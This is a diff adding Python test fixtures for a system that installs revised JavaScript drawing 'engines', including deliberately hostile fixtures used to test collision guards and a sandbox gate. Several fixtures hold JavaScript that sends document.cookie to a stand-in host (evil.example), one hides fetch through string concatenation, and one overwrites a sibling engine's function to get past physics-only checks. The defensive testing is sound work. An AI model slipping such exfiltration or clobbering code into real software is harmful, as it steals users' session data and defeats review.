@@ -108,3 +108,57 @@ class EngineProvider(FixtureProvider):
             return _copy.deepcopy(self.engine)
         return super().generate(role, prompt, schema, images, research)
 
+
+# A scripted REVISED engine the stub provider returns for the revise-engine role: it reuses the demo-bars draw
+# function name, Physics method names and checksName so it splices cleanly in place, with a marked drawing change, a
+# changed disclosure, and the revised guide text to apply. Behaviour (the physics) is unchanged, so the checks pass.
+GOOD_REVISED_ENGINE = {
+    'kind': 'demo-bars', 'label': 'Demo bars', 'category': 'New investigations', 'checksName': 'demoBarsChecks',
+    'physics': GOOD_ENGINE['physics'],
+    'scene': GOOD_ENGINE['scene'].replace(
+        'function drawDemoBars(ctx, w, h, spec, st) {',
+        'function drawDemoBars(ctx, w, h, spec, st) {\n // revised to address feedback', 1),
+    'entry': GOOD_ENGINE['entry'].replace(
+        'A placeholder engine built by the daily run from a research brief; it awaits the owner review.',
+        'A placeholder engine, revised from owner feedback; it awaits the owner review.'),
+    'model_notes': GOOD_ENGINE['model_notes'],
+    'summary': 'Made the drawing clearer in response to the feedback.',
+    'scene_updates': {'title': 'A placeholder guide, revised', 'subtitle': 'A teaser.', 'why': '',
+                      'takeaway': 'A revised takeaway.', 'duration': 24,
+                      'beats': [{'title': 'One', 'body': 'A.'}, {'title': 'Two', 'body': 'B.'},
+                                {'title': 'Three, revised.', 'body': 'C, revised.'}]},
+}
+# A revised engine that passes the shape and safety checks but whose drawing is invalid JavaScript, so it installs in
+# place and then fails node --check and must roll back byte-for-byte.
+BROKEN_REVISED_ENGINE = {**GOOD_REVISED_ENGINE,
+                         'scene': 'function drawDemoBars(ctx, w, h, spec, st) { return 1 2 3; }'}
+# The demonstrated cross-engine clobber: the revised scene ALSO defines a sibling engine's draw function (drawClocks)
+# that exfiltrates. node allows the duplicate declaration, allChecks is physics-only and the gate render exercises only
+# the revised kind, so without a collision guard this silently overwrites gravity-clocks and ships on merge. The
+# collision guard must reject it before any splice.
+CLOBBER_SCENE_REVISED_ENGINE = {**GOOD_REVISED_ENGINE, 'scene': GOOD_REVISED_ENGINE['scene']
+    + "\nfunction drawClocks(ctx, w, h, spec, st) { try { fetch('http://evil.example/exfil?c=' + document.cookie); } catch (e) {} }"}
+# A revised engine whose physics ALSO defines another engine's model method (deflection); rejected as defence in depth
+# (allChecks would also catch the changed value, but the guard stops it before any splice).
+CLOBBER_PHYSICS_REVISED_ENGINE = {**GOOD_REVISED_ENGINE,
+    'physics': GOOD_REVISED_ENGINE['physics'] + ",\n    deflection(mass, b) { return 999; }"}
+# A revised engine that keeps the demo-bars name (no clobber) but whose own draw reaches the network; only the real
+# locked-down sandbox gate catches it behaviourally.
+MALICIOUS_REVISED_ENGINE = {**GOOD_REVISED_ENGINE,
+    'scene': "function drawDemoBars(ctx, w, h, spec, st) { window['fet' + 'ch']('http://evil.example/exfil'); }"}
+
+
+class RevisionProvider(FixtureProvider):
+    """The offline fixture provider, plus a scripted structured revised engine for the revise-engine role."""
+    def __init__(self, revised=GOOD_REVISED_ENGINE):
+        self.revised = revised
+        self.calls = 0
+        self.usage = []
+
+    def generate(self, role, prompt, schema=None, images=(), research=False):
+        if role == 'revise-engine':
+            self.calls += 1
+            import copy as _copy
+            return _copy.deepcopy(self.revised)
+        return super().generate(role, prompt, schema, images, research)
+
